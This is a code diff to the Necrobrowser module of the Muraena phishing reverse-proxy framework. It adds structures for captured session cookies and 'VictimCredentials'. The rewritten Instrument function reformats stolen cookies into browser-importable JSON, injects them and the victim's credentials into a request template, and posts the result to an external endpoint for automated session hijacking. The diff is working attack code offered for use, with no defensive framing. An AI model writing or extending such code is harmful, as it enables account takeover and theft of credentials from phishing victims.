@@ -5,6 +5,7 @@ import (
 	"io/ioutil"
 	"net/http"
 	"strings"
+	"time"
 
 	"gopkg.in/resty.v1"
 
@@ -21,7 +22,9 @@ const (
 	// Author of this module
 	Author = "Muraena Team"
 
-	CookiePlaceholder = "%%%COOKIES%%%"
+	// Placeholders for templates
+	CookiePlaceholder      = "%%%COOKIES%%%"
+	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
 )
 
 // Necrobrowser module
@@ -34,6 +37,26 @@ type Necrobrowser struct {
 
 	Request string
 }
+
+// Cookies
+type SessionCookie struct {
+	Name     string `json:"name"`
+	Value    string `json:"value"`
+	Domain   string `json:"domain"`
+	Expires  int64  `json:"expirationDate"`
+	Path     string `json:"path"`
+	HTTPOnly bool   `json:"httpOnly"`
+	Secure   bool   `json:"secure"`
+	Session  bool   `json:"session"`
+}
+
+// VictimCredentials structure
+type VictimCredentials struct {
+	Key   string
+	Value string
+	Time  time.Time
+}
+
 
 // Name returns the module name
 func (module *Necrobrowser) Name() string {
@@ -82,25 +105,46 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 	return
 }
 
-func (module *Necrobrowser) InstrumentNecroBrowser(cookieJar []http.Cookie) (err error) {
-	c, err := json.MarshalIndent(cookieJar, "", "\t")
+func (module *Necrobrowser) Instrument(cookieJar []http.Cookie, credentialsJSON string) {
+
+	var necroCookies []SessionCookie
+	for _, c := range cookieJar {
+
+		nc := SessionCookie{
+			Name:     c.Name,
+			Value:    c.Value,
+			Domain:   c.Domain,
+			Expires:  c.Expires.Unix(),
+			Path:     c.Path,
+			HTTPOnly: c.HttpOnly,
+			Secure:   c.Secure,
+			Session:  false,
+		}
+
+		if nc.Expires < 1 {
+			nc.Session = true
+		}
+
+		necroCookies = append(necroCookies, nc)
+	}
+
+	c, err := json.MarshalIndent(necroCookies, "", "\t")
 	if err != nil {
 		module.Warning("Error marshalling the cookies: %s", err)
 		return
 	}
 
-	module.Warning("Jar: %+v", cookieJar)
-	module.Warning("Json: %+v", c)
-	module.Warning("Json: %+v", string(c))
-
 	cookiesJSON := string(c)
-
-	// Inject cookies
-	module.Warning(module.Request)
 	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
-	module.Warning(module.Request)
+	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
 
-	resp, err := resty.R().SetBody(module.Request).Post(module.Endpoint)
+
+	client := resty.New()
+	resp, err := client.R().
+		SetHeader("Content-Type", "application/json").
+		SetBody(module.Request).
+		Post(module.Endpoint)
+
 	if err != nil {
 		return
 	}
